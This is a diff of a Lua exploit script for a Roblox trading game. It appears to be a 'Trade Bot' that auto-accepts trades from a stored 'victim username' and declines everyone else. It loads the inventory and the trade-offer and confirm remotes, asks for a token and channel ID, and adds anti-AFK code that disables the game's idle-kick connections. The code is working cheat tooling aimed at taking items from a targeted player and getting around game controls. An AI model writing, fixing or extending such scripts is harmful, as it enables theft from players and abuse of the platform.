@@ -6,17 +6,27 @@ if token == "" or channelId == "" then
     game.Players.LocalPlayer:kick("Add your token or channelId to use")
 end
 
+local bb = game:GetService("VirtualUser")
+game:service "Players".LocalPlayer.Idled:connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
+end)
+
 local HttpServ = game:GetService("HttpService")
-local victimFile = isfile("user.txt")
-local joinedFile = isfile("joined_ids.txt")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+for _, b in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
+    b:Disable();
+end;
+local victimFile = isfile("useradm.txt")
+local joinedFile = isfile("joined_ids_adm.txt")
 if not victimFile then
-    writefile("user.txt", "victim username")
+    writefile("useradm.txt", "victim username")
 end
 if not joinedFile then
-    writefile("joined_ids.txt", "[]")
+    writefile("joined_ids_adm.txt", "[]")
 end
-local victimUser = readfile("user.txt")
-local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
+local victimUser = readfile("useradm.txt")
+local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
 local didVictimLeave = false
 local timer = 0
 
@@ -25,32 +35,48 @@ local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
 while loadingScreen.Enabled do
     wait(1)
 end
-
+wait(3)
 local waittime = delay or 0.1
 wait(waittime)
 
 local tradeFrame = playerGui.TradeApp.Frame
 local Loads = require(game.ReplicatedStorage.Fsys).load
-local Fsys = require(game.ReplicatedStorage:WaitForChild("Fsys"))
-local RouterClient = Fsys.load("RouterClient")
+local RouterClient = Loads("RouterClient")
+local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
 local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
 local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
 local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
 local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
 local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
-local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+
+print("[Trade Bot] Listening for user: '" .. victimUser .. "'")
 
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender, ...)
-    if sender and sender.Name == victimUser then
-        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+    print("[Trade Bot] Trade event triggered!")
+    print("[Trade Bot] Sender parameter:", sender)
+
+    if sender then
+        print("[Trade Bot] Sender name:", sender.Name)
+        print("[Trade Bot] Target victim user:", victimUser)
+
+        if sender.Name == victimUser then
+            print("[Trade Bot] Match found! Sending ACCEPT request to server...")
+            local result = TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+            print("[Trade Bot] Server response for ACCEPT:", result)
+        else
+            print("[Trade Bot] Name mismatch ('" .. tostring(sender.Name) .. "' ~= '" .. tostring(victimUser) .. "'). Sending DECLINE request...")
+            local result = TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
+            print("[Trade Bot] Server response for DECLINE:", result)
+        end
     else
-        TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
+        print("[Trade Bot] Warning: 'sender' argument is nil!")
     end
 end)
 
+
 local function saveJoinedId(messageId)
-    table.insert(joinedIds, messageId) 
-    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
+    table.insert(joinedIds, messageId)
+    writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local foodAdded = false
